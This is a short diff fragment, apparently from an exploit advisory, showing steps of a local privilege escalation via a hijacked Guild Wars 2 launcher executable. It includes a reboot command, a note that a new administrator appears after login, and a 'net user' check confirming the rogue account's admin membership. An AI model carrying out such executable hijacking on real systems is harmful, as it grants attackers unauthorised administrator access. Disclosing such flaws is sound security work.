@@ -92,7 +92,7 @@ The user name could not be found
 
 D:\Guild Wars 2> shutdown /r
 
-#7. Login & now start the Guild Wars 2 Game, launcher will start execute our system commands, and then start the official Game Launcher, so the .exe  was hijacked without a problem.
+#7. Login & look at that new Admin
 
 C:\Users\lowpriv>net user placebo | findstr /i "Membership Name" | findstr /v "Full"
 
